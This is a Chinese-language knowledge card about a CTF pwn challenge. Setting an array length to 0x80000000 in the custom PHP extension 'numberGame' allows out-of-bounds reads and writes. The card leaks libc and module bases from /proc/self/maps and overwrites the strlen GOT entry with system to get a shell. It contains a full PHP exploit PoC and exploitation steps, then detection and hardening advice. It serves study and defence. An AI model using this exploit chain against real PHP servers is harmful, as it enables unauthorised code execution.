---
id: binary-pwn-php-extension-array-length-oob-strlen-got-system
title: PHP 扩展 numberGame：数组长度项设 0x80000000 越界读写，/proc/self/maps 泄模块/libc 基址后把 strlen GOT 低 4 字节改为 system
type: scenario
domain: binary
path: binary/pwn
technique: php-extension-array-length-oob-got-low32-system
aliases:
- numberGame
- PHP 扩展 pwn
- PHP 数组越界读写
- 0x80000000 长度
- strlen GOT 低四字节 system
- php -S gdbserver
- no-debug-non-zts-20230831
tags:
- pwn
- php-extension
- array-oob
- strlen
- got-hijack
- partial-overwrite
- gdbserver
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V364
  verified_at: '2026-11-09T03:28:33+08:00'
  notes: 已对照原文与图15-16核对：PHP 8.3.7 容器内上传 Ubuntu22 gdbserver 调 php -S；exp 的 add_chunk(5,[0,0,0,0x80000000,0]) 放大数组范围、include(/proc/self/maps) 正则取 libc/numberGame.so 基址、show_chunk(0) 越界读 $rel[7]/$rel[8] 拼堆地址并减 72 得数组起始、strlen GOT=模块基址+0x4008、edit_chunk 以 4 字节写 system 低 32 位、edit_name 触发，均与原文 exp 一致。未验证点：扩展内部长度字段语义与 edit_name 调 strlen 的实现文章未展开（按 exp 注释推断），未反编译 .so；0x4008/0x4c490 偏移属题目环境。dedup 首候选仅自身 exact，无同链重复；dup-scan.json 早于建卡且无本卡 pair。无 sources/文章 ID/URL，path 合法。
---

## 一句话结论

当 PHP 扩展把内部数组的长度/容量字段暴露给用户控制时，把其中一项设成 `0x80000000`（INT_MIN）会让长度按有符号解释成负数或超大值，`show_chunk/edit_chunk` 的边界检查失效，从而可按索引越界读写整个进程内存；本题先用 `/proc/self/maps` 泄露 libc 与扩展模块基址、用越界读泄露堆地址，再把模块 GOT 中的 `strlen` 低 4 字节改成 `system`，触发 `strlen("/bin/sh")` 即执行 `system("/bin/sh")`。

## 原理

- **PHP 扩展的数组边界缺陷**：扩展导出的 `add_chunk` 在内部维护一个 chunk 数组（示例中 heap 上 `数组起始 = heap - 72`），并把数组中的某一项当作长度/容量使用。`add_chunk(5, [0,0,0,0x80000000,0], "test1")` 把下标 4 的元素设为 `0x80000000`，扩展按有符号 32 位解释后得到 INT_MIN 或换算成超大无符号范围，`show_chunk/edit_chunk` 只按这个“长度”做检查，于是任何索引都通过，形成越界读（泄露）与 4 字节粒度越界写。
- **为什么要 0x80000000**：有符号比较里 `INT_MIN` 小于任何正索引；若有检查写成 `idx < len`，负/超大长度会让检查恒真或溢出绕过。具体是“负长度”还是“超大长度”取决于扩展内部的类型转换，文章只给结论“会把数组控制的范围增大”，实现按目标 .so 反编译确认。
- **泄基址**：扩展函数 `show_chunk(0)` 返回越界读到的数组元素；`$rel[7] + ($rel[8] << 32)` 组合出堆地址，`$of = $heap - 72` 即数组起始。另一路通过 `ob_start("leakaddr")` 捕获 `include("/proc/self/maps")` 的输出，正则提取 `libc.so.6` 与 `numberGame.so` 的映射基址（`$libc[1][0]`、`$mbase[1][0]`）。
- **低 4 字节改 GOT**：`strlen@got` 位于 `numberGame.so` 基址 `+0x4008`；GOT 原值是指向 libc `strlen` 的 8 字节地址，libc 与 `system` 的偏移都小于 4GB 且共享同一 ASLR 高 32 位，因此只把低 4 字节改成 `system & 0xffffffff` 即可让 GOT 指向 `system`，高位保持不变，避免了写入 8 字节时的空字节/高地址问题。
- **越界写原语**：`edit_chunk(0, $offset, $value)` 以数组起始 `$of` 为基准、按 4 字节元素写入：`$offset = ($str_got - $of) / 4`，`$value = system & 0xffffffff`。负数或超大 offset 同样因长度检查失效而通过。
- **触发**：扩展的 `edit_name(1, '1')` 内部对名字调用 `strlen`；此前 `add_chunk(1,[0],"/bin/sh")` 已把 `/bin/sh` 放进可控位置，strlen GOT 被改成 system 后，调用变成 `system("/bin/sh")`，拿到 shell 后执行 `./readflag`。
- **调试方式**：把 Ubuntu 22 的 gdbserver 上传进容器，`gdbserver :1234 php -S 0:8080`，Kali 侧 pwndbg `target remote`；扩展模块在请求处理时加载，需先断在模块加载点再对 `zif_` 符号下断（调试细节见关联卡）。

## 触发条件

- 目标以 PHP（CLI server 或 Apache mod_php）加载存在数组长度/边界缺陷的自定义扩展 `.so`，扩展把内部数组的长度字段暴露给用户或允许用户写入该字段。
- 扩展提供读、写、按索引操作的接口（示例 `add_chunk/show_chunk/edit_chunk/edit_name`），且长度检查使用有符号整数或发生截断。
- 能读取 `/proc/self/maps`（同进程内 PHP 代码 `include` 即可）或另有 libc/模块基址泄露。
- 模块 GOT 可写（Partial RELRO），且 `strlen` GOT 项存在（扩展内部调用 strlen）。
- 目标 libc 的 `strlen` 与 `system` 高 32 位相同（同一映射、ASLR 基址共享），低 4 字节覆盖可命中。

## 利用步骤

1. **确认扩展与接口**：`php -m`/`phpinfo()` 看扩展名；反编译 `.so` 找 `zif_` 函数与数组/长度字段偏移；用 `no-debug-non-zts-<API>` 路径确认 PHP 版本 API。
2. **调试环境**：容器内起 `gdbserver :1234 php -S 0:8080`；先断模块加载点，再对 `zif_*` 下断，观察数组结构与 GOT。
3. **布置越界长度**：`add_chunk(5,[0,0,0,0x80000000,0],"test1")`，让扩展的长度字段变成 INT_MIN/超大值。
4. **泄基址**：`ob_start("leakaddr"); include("/proc/self/maps");` 提取 libc 与模块基址；`show_chunk(0)` 读越界元素，`$heap = $rel[7] + ($rel[8] << 32)`，`$of = $heap - 72`。
5. **算目标偏移**：`$str_got = 模块基址 + 0x4008`；`$offset = ($str_got - $of) / 4`；`$system = libc 基址 + libc.sym['system']`。
6. **写 GOT**：`edit_chunk(0, $offset, $system & 0xffffffff)`，只改低 4 字节。
7. **触发**：准备 `/bin/sh` 字符串（`add_chunk(1,[0],"/bin/sh")`），调用 `edit_name(1,'1')` 让扩展执行 `strlen("/bin/sh")`，实际进入 `system("/bin/sh")`；在 shell 中读 flag。

## PoC

```php
<?php
$heap_base = 0; $libc_base = 0; $libc = ""; $mbase = "";

function leakaddr($buffer){
    global $libc, $mbase;
    preg_match_all('/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/', $buffer, $libc);
    preg_match_all('/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/numberGame.so/', $buffer, $mbase);
    return "";
}

ob_start("leakaddr");
include("/proc/self/maps");
$buffer = ob_get_contents();
ob_end_flush();
leakaddr($buffer);

echo "\n----1-----\n";
add_chunk(5,[0,0,0,0x80000000,0],"test1");   # 长度字段置 INT_MIN
add_chunk(1,[0],"/bin/sh");
$rel = show_chunk(0);                          # 越界读
$heap = $rel[7] + ($rel[8] << 0x20);
$of = $heap - 72;                              # 数组起始
$str_got = hexdec($mbase[1][0]) + 0x4008;      # strlen GOT
$offset = ($str_got - $of) / 4;
$system = hexdec($libc[1][0]) + 0x4c490;       # libc 内 system 偏移
edit_chunk(0, $offset, $system & 0xffffffff);  # 低 4 字节改 strlen GOT
edit_name(1, '1');                             # 触发 strlen("/bin/sh") -> system
?>
```

成功后 shell 中执行 `./readflag` 读取 flag。

## 变体与关联

- **调试与符号**：PHP 扩展的 gdbserver 附加、`zif_` 断点与模块加载点见 [[code-analysis-dynamic-debugging-php-extension-apache-gdbserver-zif-symbols]]；本题用 `php -S` CLI server，原理相同。
- **PHP 扩展栈溢出**：另一类扩展漏洞是 `strcpy/readline` 等栈溢出提权，见 [[binary-pwn-stack-php-extension-lverifier-username-overflow-root-webshell]]。
- **低 4 字节 GOT 覆盖**：适用于同一 libc 映射内的函数互换（strlen↔system、atoi↔system 等）；若目标函数与替代函数跨映射（不同 so），高 32 位不同则不可用，需要完整 8 字节写或另找目标。
- **数组长度绕过变体**：有符号长度、`int` 截断、`0x80000000`/`0xFFFFFFFF` 都是“长度检查失效”的常见来源；审计时看 `idx < len` 的 `len` 类型与来源。
- **边界**：不同 PHP API 版本扩展结构体/数组头偏移不同；`0x4008`、`0x4c490` 等偏移依赖题目 .so 与 libc，迁移必须重算。

## 检测与防御

- **扩展开发**：数组长度/容量字段不要暴露给 PHP 用户可写；所有索引做有符号检查并同时限制上下界；用 `zend_hash` 等安全容器而非裸数组加手写边界。
- **加固**：扩展与 PHP 主程序开启 PIE、Full RELRO（GOT 只读）、FORTIFY；限制 PHP 进程可读 `/proc/self/maps`（容器内仍可读，需运行时防护）。
- **检测特征**：PHP 请求中出现 `0x80000000` 等异常长度参数；扩展进程执行 `gdbserver`/调试端口；GOT 被写入非预期地址；`strlen` 调用跳到 `system`。
- **应急**：若扩展为第三方/比赛用，先禁用扩展；检查 `.so` 的 GOT 与模块完整性；审计扩展源码中的长度字段与 `zif_` 函数。
